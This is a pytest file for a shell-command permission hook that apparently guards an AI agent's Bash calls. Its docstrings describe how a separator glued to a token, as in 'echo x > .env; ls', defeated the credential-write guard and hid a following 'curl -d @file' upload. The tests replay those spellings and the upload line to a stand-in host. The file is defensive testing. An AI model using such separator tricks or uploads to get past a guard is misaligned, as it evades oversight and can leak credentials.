"""A control operator with NO SPACE in front of it was invisible to both Bash gates.

`shlex.split(cmd, posix=False)` forces whitespace_split=True, so an unquoted run of
non-whitespace is ONE token whatever punctuation it carries. Measured before the fix:

    shlex.split('foo > src/log.txt; bar', posix=False) -> ['foo','>','src/log.txt;','bar']
    shlex.split('foo 2>/dev/null; bar', posix=False)   -> ['foo','2>/dev/null;','bar']

Three consequences, all measured through the embedded extractor and the real hook:
corrupted target VALUES (`.env;`, `<cwd>/src/log.txt;`); a DEFEATED credential guard,
because `_is_credential_path` is basename-driven and `.env;` is not a credential basename
(end to end, work mode, BOTH gates approved: `echo x > .env ; ls` denied while
`echo x > .env; ls` and `echo x > .env&& ls` were allowed silently); and an INVISIBLE
following command, because `verb_at` only inspects seg[0], so a glued separator before
`curl -d @f https://h` lost the egress row.

NOTHING HERE ASSERTS ON PROSE. The matrix is DERIVED from the hook's own CONTROL set and
its own `cmd0` write arms, so a new operator or a new write-verb arm cannot silently skip
coverage, and each derivation's precision is pinned against SYNTHETIC source text rather
than against the real file's current wording.
"""
from __future__ import annotations

import ast
import json
import os
import re
import subprocess
import sys
import tempfile
import uuid
from pathlib import Path

import pytest

# autouse: pins cwd to a sandbox, this file's convention as much as the modules it reuses.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_egress_gate import _extract_egress
from tests.test_bash_write_gate import (
    HOOK_SH,
    SKILL_ROOT,
    _extractor_src,
    _run_hook,
    _seed,
    run_extractor,
)

WT_HOOK = os.path.join(SKILL_ROOT, "hooks", "scripts", "writ-worktree-safety.sh")
PKG_MODULE = os.path.join(SKILL_ROOT, "writ", "session", "bash_tokens.py")
MIRROR_FILES = (PKG_MODULE, HOOK_SH, WT_HOOK)

MARK_BEGIN = "# MIRROR BEGIN split_control_operators"
MARK_END = "# MIRROR END split_control_operators"

CWD = "/proj"
TARGET = "src/log.txt"
TDIR = "src"
EXPECTED_TARGET = ("local", CWD + "/" + TARGET)
EXPECTED_TDIR = ("local", CWD + "/" + TDIR)


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _extract_rows(cmd: str, cwd: str = CWD, extra_env: dict | None = None):
    """(kind, path) rows the embedded extractor emits (egress rows excluded).

    Through `run_extractor`, which hands the command over on a FILE and strips the
    completion sentinel, because that is the transport the hook itself now uses; a
    harness still setting `WRIT_BASH_CMD` would pin a transport production no longer
    has."""
    env = dict(os.environ)
    if extra_env:
        env.update(extra_env)
    _p, lines = run_extractor(cmd, cwd, env=env)
    rows = set()
    for line in lines:
        parts = line.split("\t", 2)
        if len(parts) == 2:
            rows.add((parts[0], parts[1]))
    return rows


def _mirror_block(path: str) -> str:
    text = Path(path).read_text()
    start = text.index(MARK_BEGIN) + len(MARK_BEGIN)
    end = text.index(MARK_END, start)
    return text[start:end].strip("\n")


def _load_mirror(path: str):
    ns: dict = {}
    exec(compile(_mirror_block(path), "<mirror:%s>" % path, "exec"), ns)
    return ns["split_control_operators"]


def _package_splitter():
    if SKILL_ROOT not in sys.path:
        sys.path.insert(0, SKILL_ROOT)
    from writ.session.bash_tokens import split_control_operators
    return split_control_operators


# --------------------------------------------------------------------------- #
# 1. the population, DERIVED from the hook rather than listed here
# --------------------------------------------------------------------------- #
_CONTROL_RE = re.compile(r"^CONTROL = (\{.*\})$", re.M)
# `if`/`elif` anchored on purpose: `seg_is_test = cmd0 in ("[", "[[", "test")` is a
# comparison, not a write arm, and must not enter the population.
_ARM_RE = re.compile(r'\b(?:if|elif) cmd0 (?:==|in) (\([^)]*\)|"[a-z]+")\s*:')


# The members a user can TYPE. The newline family is excluded BY NAME and its absence is
# an ERROR rather than a silent narrowing: a literal "\n" never becomes a token at all
# (shlex discards it), and the SEP sentinel is INSERTED by the hook's own pre-split, so a
# "glued" matrix cell for either would exercise a construct no shell input can produce.
# The newline separator's own behavior lives in tests/test_bash_newline_separator_gate.py.
NON_TYPEABLE = frozenset({"\n", "\x00"})


def control_operators(source: str) -> set[str]:
    """The hook's own control-operator set, minus the non-typeable newline family."""
    m = _CONTROL_RE.search(source)
    assert m, "CONTROL set not found; the derivation is broken, not the hook"
    members = set(ast.literal_eval(m.group(1)))
    assert members & NON_TYPEABLE, (
        "no newline-family member in CONTROL: the SEP sentinel is what makes a multi-line "
        "command segment at all, and this derivation is blind to its removal")
    return members - NON_TYPEABLE


def write_verb_arms(source: str) -> set[str]:
    """Every verb the extractor has a command-specific write arm for."""
    verbs: set[str] = set()
    for m in _ARM_RE.finditer(source):
        val = ast.literal_eval(m.group(1))
        verbs |= set(val) if isinstance(val, tuple) else {val}
    return verbs


OPERATORS = sorted(control_operators(_extractor_src()))
SPACINGS = {"glued": "", "spaced": " "}
# {sp} is the spacing before the operator; the operator sits right after the token that
# carries the write target, which is where gluing corrupts the value.
CONSUMERS = {
    "redirect":      ("echo x > {t}{sp}{op} ls", EXPECTED_TARGET),
    "append":        ("echo x >> {t}{sp}{op} ls", EXPECTED_TARGET),
    "tee":           ("echo x | tee {t}{sp}{op} ls", EXPECTED_TARGET),
    "dd":            ("dd if=/dev/zero of={t}{sp}{op} ls", EXPECTED_TARGET),
    "cp_dest":       ("cp seed.txt {t}{sp}{op} ls", EXPECTED_TARGET),
    "mv_dest":       ("mv seed.txt {t}{sp}{op} ls", EXPECTED_TARGET),
    "install_dest":  ("install seed.txt {t}{sp}{op} ls", EXPECTED_TARGET),
    "cp_target_dir": ("cp -t {d}{sp}{op} seed.txt", EXPECTED_TDIR),
    "sed_i":         ("sed -i s/a/b/ {t}{sp}{op} ls", EXPECTED_TARGET),
}
MATRIX = [
    (name, op, spacing,
     tmpl.format(t=TARGET, d=TDIR, sp=SPACINGS[spacing], op=op), expected)
    for name, (tmpl, expected) in sorted(CONSUMERS.items())
    for op in OPERATORS
    for spacing in sorted(SPACINGS)
]


class TestTheMatrixIsDerivedAndComplete:
    """A derivation that silently returned nothing would make every cell below vacuous."""

    def test_matrix_is_not_empty(self):
        assert MATRIX

    def test_matrix_covers_the_full_cross_product(self):
        assert len(MATRIX) == len(CONSUMERS) * len(OPERATORS) * len(SPACINGS)

    def test_every_control_operator_the_hook_knows_has_cells(self):
        covered = {op for _n, op, _s, _c, _e in MATRIX}
        assert covered == control_operators(_extractor_src())

    def test_every_write_verb_arm_the_hook_has_is_exercised(self):
        # A future `elif cmd0 == "rsync":` with no cell reddens HERE rather than
        # shipping uncovered. The redirect/append cells cover the REDIR path, whose
        # verb (`echo`) is not a cmd0 arm, so they are not part of this comparison.
        #
        # ASKED AS "does this arm appear in SOME template", not "is it the template's
        # FIRST WORD". The first-word spelling was wrong and said so out loud: `tee` is
        # reached through a pipe (`echo x | tee ...`), so its template's first word is
        # `echo` and the real `tee` arm read as uncovered. Still conditional, because an
        # arm named in the hook and in no template lands in `missing`.
        arms = write_verb_arms(_extractor_src())
        templates = " ".join(tmpl for tmpl, _e in CONSUMERS.values())
        missing = {a for a in arms if not re.search(rf"\b{re.escape(a)}\b", templates)}
        assert not missing, f"write verb arms with no matrix cell: {sorted(missing)}"

    def test_the_operator_scan_is_precise_against_synthetic_source(self):
        assert control_operators('CONTROL = {"@@", ";", "\\x00"}\n') == {"@@", ";"}

    def test_the_scan_reddens_when_the_newline_family_leaves_the_set(self):
        # A DECAYED hook must not read green here. Without this, deleting the SEP member
        # (which turns the multi-line fix off completely) would only SHRINK a population
        # every assertion below iterates, and nothing would go red.
        with pytest.raises(AssertionError):
            control_operators('CONTROL = {"@@", ";"}\n')

    def test_the_write_arm_scan_is_precise_against_synthetic_source(self):
        synthetic = (
            '    seg_is_test = cmd0 in ("[", "[[", "test")\n'
            '    if cmd0 == "zzz":\n'
            '    elif cmd0 in ("yyy", "xxx"):\n'
        )
        assert write_verb_arms(synthetic) == {"zzz", "yyy", "xxx"}


# --------------------------------------------------------------------------- #
# 2. the matrix itself: the extracted target is the CLEAN path in every cell
# --------------------------------------------------------------------------- #
CORRUPTING = ";&|"


@pytest.mark.parametrize(
    "name,op,spacing,cmd,expected",
    MATRIX,
    ids=["%s-%s-%s" % (n, s, op) for n, op, s, _c, _e in MATRIX],
)
def test_the_extracted_target_is_the_clean_path(name, op, spacing, cmd, expected):
    rows = _extract_rows(cmd)
    assert expected in rows, (cmd, rows)
    corrupt = [p for _k, p in rows if any(ch in p for ch in CORRUPTING)]
    assert not corrupt, (cmd, corrupt)


# --------------------------------------------------------------------------- #
# 3. THE TRAP: `&` is also a file-descriptor duplicate
# --------------------------------------------------------------------------- #
class TestTheFdDupSurvivesAndTheSeparatorStillSplits:
    """`2>&1` must stay ONE token. Splitting `&` unconditionally would break every
    redirect's reading, and it must not become a target either: today
    `foo >/dev/null 2>&1; bar` yields NO target because redir_target returns None for a
    fd-dup, which happens to swallow the `;` harmlessly. Both halves are pinned, in both
    spellings, because a fix that segments correctly and invents a `&1` target has traded
    one defect for another."""

    @pytest.mark.parametrize("cmd", [
        "echo x >/dev/null 2>&1; cp seed.txt src/x.py",
        "echo x >/dev/null 2>&1 ; cp seed.txt src/x.py",
    ])
    def test_only_the_real_target_is_extracted(self, cmd):
        # EXACT equality: /dev/null is NONFILE, and `&1`, `1` and `/dev/null;` are all
        # things a naive split would emit here.
        assert _extract_rows(cmd) == {("local", CWD + "/src/x.py")}, cmd

    @pytest.mark.parametrize("cmd", [
        "echo x 2>&1; ls",
        "echo x 2>&1 ; ls",
        "echo x >&2; ls",
    ])
    def test_a_bare_fd_dup_yields_no_target_at_all(self, cmd):
        assert _extract_rows(cmd) == set(), cmd

    # MEASURED REFUTATION of this class's own conditionality, and the reason the two
    # assertions below exist. Deleting the fd-dup arm from the splitter leaves both tests
    # above GREEN. Traced: without the arm `2>&1` splits to ['2>', '&', '1'], `&` is in
    # CONTROL so it becomes a SEGMENT BOUNDARY, `2>` is left last in its segment, and
    # redir_target('2>', None) returns None on the nxt-is-None guard. The phantom the arm
    # prevents is only reachable if `&` stops being a boundary, which it is not. So the
    # arm's effect is confined to the TOKEN STREAM under today's consumers, and target-level
    # assertions cannot see it. Pinned where the property actually lives, with the downstream
    # insensitivity stated rather than implied.
    @pytest.mark.parametrize("token", ["2>&1", ">&2", "<&3", "2>&1;", ">&2&& ls"])
    def test_the_fd_dup_is_never_split_apart(self, token):
        got = _package_splitter()([token])
        assert got[0].startswith(token.split(";")[0].split("&&")[0].rstrip()), (
            f"the fd-dup was broken up: {token!r} -> {got!r}")
        assert "&" not in got[1:], f"a fd-dup `&` became its own token: {token!r} -> {got!r}"


# --------------------------------------------------------------------------- #
# 4. invariants the fix leans on, and the one shape it newly sees
# --------------------------------------------------------------------------- #
class TestRedirectSpellingsKeepTheirMeaning:
    def test_a_quoted_target_followed_by_a_glued_separator_still_resolves(self):
        # Correct TODAY (shlex ends a token at a closing quote with no following
        # whitespace) and the invariant the splitter rests on: a quoted span is never
        # re-split.
        assert EXPECTED_TARGET in _extract_rows('echo x > "%s"; ls' % TARGET)

    def test_clobber_override_still_resolves(self):
        assert EXPECTED_TARGET in _extract_rows("echo x >| %s; ls" % TARGET)

    def test_process_substitution_is_still_not_a_target(self):
        assert _extract_rows("echo x | tee >(cat); ls") == set()

    def test_the_ampersand_redirect_operator_resolves_spaced_and_glued(self):
        # `&>` glued to the verb in front of it IS split, because an `&` there can only
        # start a redirect. This is the one member of the disclosed `foo>bar` family the
        # fix widens into.
        assert EXPECTED_TARGET in _extract_rows("echo x &>%s; ls" % TARGET)
        assert EXPECTED_TARGET in _extract_rows("echo x&>%s" % TARGET)

    def test_a_quoted_operator_is_still_not_an_operator(self):
        # `grep ';' app.py` must not segment, and `grep '>' f` must not redirect.
        assert _extract_rows("grep ';' src/app.py") == set()
        assert _extract_rows("grep '>' src/app.py") == set()


# --------------------------------------------------------------------------- #
# 5. the credential guard, END TO END through the REAL hook
# --------------------------------------------------------------------------- #
class TestCredentialWriteWithAGluedSeparator:
    """The measured defect: in work mode with BOTH gates approved,
    `echo x > .env ; ls` denied and `echo x > .env; ls` was ALLOWED SILENTLY, because
    `_is_credential_path` is basename-driven and `.env;` is not a credential basename.
    The seeded state is the one where it was allowed, on purpose: a pre-approval state
    would deny for the unrelated ENF-GATE-PLAN reason and prove nothing about this fix.
    No credential file is created or read anywhere here."""

    def _sid(self):
        sid = "bcos-%s" % uuid.uuid4().hex[:8]
        _seed(sid, mode="work", gates_approved=["phase-a", "test-skeletons"],
              current_phase="implementation")
        return sid

    @pytest.mark.parametrize("op", OPERATORS)
    @pytest.mark.parametrize("spacing", sorted(SPACINGS))
    def test_a_credential_write_denies_glued_and_spaced(self, op, spacing, tmp_path):
        cmd = "echo x > .env%s%s ls" % (SPACINGS[spacing], op)
        out = _run_hook(cmd, self._sid(), str(tmp_path))
        assert out is not None, cmd
        assert out.get("permissionDecision") == "deny", (cmd, out)
        assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), cmd

    @pytest.mark.parametrize("path", [".env", "id_rsa", "deploy.pem"])
    def test_the_classifier_never_sees_the_operator(self, path):
        rows = _extract_rows("echo x > %s; ls" % path)
        assert ("cred", path) in rows, rows


# --------------------------------------------------------------------------- #
# 6. egress: the command AFTER a glued separator is not invisible
# --------------------------------------------------------------------------- #
class TestEgressAfterAGluedSeparator:
    """verb_at reads seg[0] only, so with the operator glued the transfer verb was
    trapped as a trailing argument of the previous command and never resolved. Measured:
    `echo x > src/a.txt ; curl -d @src/a.txt https://example.invalid` produced an egress
    row and the glued spelling produced NONE."""

    def test_the_egress_row_appears_with_the_separator_glued(self):
        cmd = "echo x > src/a.txt; curl -d @src/a.txt https://example.invalid"
        hosts = {h for h, _d in _extract_egress(cmd, cwd=CWD)}
        assert "example.invalid" in hosts, hosts
        assert ("local", CWD + "/src/a.txt") in _extract_rows(cmd)

    def test_the_real_hook_asks_with_the_separator_glued(self, tmp_path):
        # No write target in this command, so the verdict needs no daemon and no gate
        # state beyond a mode: the egress ask is mode-independent.
        sid = "bcos-%s" % uuid.uuid4().hex[:8]
        _seed(sid, mode="conversation")
        out = _run_hook("ls; curl -d @src/a.txt https://example.invalid",
                        sid, str(tmp_path))
        assert out is not None
        assert out.get("permissionDecision") == "ask", out
        assert "example.invalid" in out.get("permissionDecisionReason", ""), out


# --------------------------------------------------------------------------- #
# 7. ONE authored splitter: the copies are identical and equivalent
# --------------------------------------------------------------------------- #
class TestThereIsOnlyOneSplitter:
    """Both hooks need this and both must stay fixed: one fixed copy and one broken copy
    is the door-divergence failure the previous cycles were about. The mirror exists
    because the hooks run the SYSTEM python3 and reach the package only through the
    sys.path insert; it is PROVED rather than trusted, because under .venv (which carries
    an editable install of this package) the suite always exercises the package copy, so
    a hand-written fallback would otherwise never run in any test."""

    def test_all_three_copies_are_textually_identical(self):
        blocks = {p: _mirror_block(p) for p in MIRROR_FILES}
        assert len(set(blocks.values())) == 1, sorted(blocks)

    def test_the_mirror_block_is_not_empty(self):
        for path in MIRROR_FILES:
            assert "def split_control_operators" in _mirror_block(path), path

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_each_copy_computes_the_same_token_stream(self, path):
        import shlex
        pkg = _package_splitter()
        mirror = _load_mirror(path)
        commands = [cmd for _n, _o, _s, cmd, _e in MATRIX] + [
            "echo x >/dev/null 2>&1; cp seed.txt src/x.py",
            'echo x > "src/log.txt"; ls',
            "echo x&>src/log.txt",
            "grep ';' src/app.py",
            "sed -i -e 's/a/b/;s/c/d/' src/app.py",
            "ls; curl -d @src/a.txt https://example.invalid",
            "echo prep&& git worktree add scratch/x x",
            "ls\ncp seed.txt src/x.py",
            "cat <<'EOF' > docs/notes.txt\nold: echo y > src/x.py\nEOF\ncp seed.txt src/z.py",
            'printf "%s" "step one\ncp seed.txt src/x.py"',
        ]
        for cmd in commands:
            toks = shlex.split(cmd, comments=False, posix=False)
            assert mirror(toks) == pkg(toks), (path, cmd)


class TestTheMirrorBlockNeedsNoImports:
    """The block is pasted inline into two hooks and exec'd bare by _load_mirror, so a
    module-level `re` (which is what the retired HEREDOC pattern needed) would make the
    package copy work and both inline copies raise NameError at import-fallback time."""

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_the_block_execs_in_an_empty_namespace(self, path):
        ns: dict = {}
        exec(compile(_mirror_block(path), "<mirror:%s>" % path, "exec"), ns)
        for name in ("SEP", "split_commands", "heredoc_terminator",
                     "strip_heredoc_bodies", "split_control_operators"):
            assert name in ns, (path, name)

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_the_block_contains_no_import_statement(self, path):
        block = _mirror_block(path)
        offenders = [ln for ln in block.splitlines()
                     if ln.strip().startswith(("import ", "from "))]
        assert not offenders, (path, offenders)


class TestThePackageCopyIsTheOneThatRuns:
    """A POSITIVE signal, not an absence. The mirror makes a failed import behave
    identically, so nothing in the verdicts can tell you whether the import resolved;
    without this test, an unreachable package would look exactly like a working one."""

    PROBE = (
        "import os, sys\n"
        "sys.path.insert(0, os.environ.get('WRIT_DIR', ''))\n"
        "from writ.session.bash_tokens import split_control_operators as f\n"
        "print(f.__module__)\n"
    )

    def _run(self, writ_dir):
        # -S disables site-packages, so the venv's EDITABLE install of this package
        # cannot satisfy the import and the sys.path insert is the only mechanism left.
        # -E keeps PYTHONPATH out of it. cwd is the temp dir so no implicit cwd import.
        return subprocess.run(
            [sys.executable, "-S", "-E", "-c", self.PROBE],
            cwd=tempfile.gettempdir(),
            env={"WRIT_DIR": writ_dir, "PATH": os.environ.get("PATH", "")},
            capture_output=True, text=True)

    def test_the_insert_makes_the_package_importable(self):
        p = self._run(SKILL_ROOT)
        assert p.stdout.strip() == "writ.session.bash_tokens", p.stderr

    def test_without_the_insert_it_is_not_importable(self):
        # The negative control: if this passed too, the test above would be proving
        # nothing about the mechanism.
        assert self._run("").returncode != 0

    @pytest.mark.parametrize("hook", [HOOK_SH, WT_HOOK])
    def test_each_hook_prepares_the_path_and_imports(self, hook):
        src = Path(hook).read_text()
        assert 'sys.path.insert(0, os.environ.get("WRIT_DIR", ""))' in src, hook
        assert "from writ.session.bash_tokens import split_control_operators" in src
        assert 'WRIT_DIR="$WRIT_DIR"' in src, hook


# --------------------------------------------------------------------------- #
# 8. totality: no input raises, and splitting twice equals splitting once
# --------------------------------------------------------------------------- #
class TestTheSplitterIsTotalAndIdempotent:
    CASES = [
        [], [""], [";"], ["&"], ["&&"], ["|"], ["||"], ["\\"], ["'"], ['"'],
        ["'unterminated"], [">"], [">>"], [">|"], ["2>&1"], ["&>"], ["<&3"],
        ["a;;b"], [";;;"], ["a&&&b"], ["a|||b"], ["--data-raw='a;b'"],
        ["$(ls;pwd)"], ["s/a/b/\\;s/c/d/"],
    ]

    @pytest.mark.parametrize("toks", CASES)
    def test_no_input_raises(self, toks):
        assert isinstance(_package_splitter()(toks), list)

    @pytest.mark.parametrize("toks", CASES)
    def test_splitting_twice_equals_splitting_once(self, toks):
        f = _package_splitter()
        once = f(toks)
        assert f(once) == once, toks
